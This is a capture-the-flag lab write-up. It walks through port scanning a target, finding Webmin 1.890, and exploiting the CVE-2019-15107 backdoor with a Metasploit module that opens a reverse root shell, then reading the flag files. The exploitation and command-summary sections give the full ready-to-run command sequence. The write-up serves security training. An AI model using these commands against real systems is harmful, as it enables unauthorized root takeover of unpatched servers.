# Source Room 


---
 
## Room Overview
 
The Source room by Darkstar challenges you to enumerate a target machine, identify a vulnerable Webmin service (version 1.890), and exploit a backdoor for root access. This realistic boot-to-root scenario highlights supply chain attacks where malicious code was injected into Webmin builds.
 
---
 
## Enumeration
 
Began with fast port scanning using RustScan (or Nmap equivalent):
 
```bash
rustscan -a 10.10.x.x -- -sC -sV
```
 
**Open ports discovered:**
 
- `22/tcp` — OpenSSH 7.2p2 (SSH)
- `10000/tcp` — MiniServ 1.890 (Webmin HTTP/HTTPS)
 
Browsed to `https://10.10.x.x:10000` which showed a login prompt for the web-based admin tool. No credentials available yet, so focused on version fingerprinting.
 
---
 
## Vulnerability Identification
 
Searched for "Webmin 1.890 exploit" which revealed **CVE-2019-15107** (Webmin backdoor). This vulnerability stems from a 2019 supply chain compromise where attackers injected malicious code into Webmin's build server.
 
- **Affected versions:** 1.880 - 1.900
- **Impact:** Unauthenticated remote code execution as root
- **Official advisory:** Webmin's security page details the backdoor in `password_change.cgi`
 
---
 
## Exploitation
 
Launched Metasploit module for the backdoor:
 
```bash
msfconsole -q
use exploit/linux/http/webmin_backdoor
set RHOSTS 10.10.x.x
set RPORT 10000
set SSL true
set LHOST <your-ip>
set LPORT 4444
exploit
```
 
**Module execution:**
 
- Target confirmed vulnerable
- Payload delivered via the backdoor
- Meterpreter session opened as `root` in `/usr/share/webmin`
 
Upgraded to a stable shell and retrieved flags:
 
```bash
# Get user flag
cat /home/dark/user.txt
 
# Get root flag
cat /root/root.txt
```
 
---
 
## Full Attack Chain
 
```
RustScan/Nmap → Webmin 1.890 → CVE-2019-15107 → Metasploit → Root Shell
```
 
---
 
## Key Commands Summary
 
```bash
# Enumeration
rustscan -a $IP -- -sC -sV -p 22,10000
nmap -sC -sV -p 22,10000 $IP
 
# Metasploit exploit
msfconsole
use exploit/linux/http/webmin_backdoor
set RHOSTS $IP
set RPORT 10000
set SSL true
exploit
 
# Post-exploitation
whoami  # root
cat /home/dark/user.txt
cat /root/root.txt
```
 
---
 
## Skills Demonstrated
 
- Fast port scanning (RustScan/Nmap)
- Web application fingerprinting
- Vulnerability research (Exploit-DB, CVE lookup)
- Metasploit exploitation of real-world backdoors
- Supply chain attack awareness
 
---
 
## Lessons Learned
 
- Exposed admin panels like Webmin are high-risk when unpatched
- Supply chain compromises can embed backdoors in legitimate software builds
- Version enumeration accelerates targeted exploitation
- Always verify SSL/TLS for web services on non-standard ports
 
---
 
---
 
## Quick Summary
 
Webmin 1.890 backdoor (CVE-2019-15107) → Metasploit RCE → Root Access
 
rustscan → webmin:10000 → msf exploit → root.txt
```
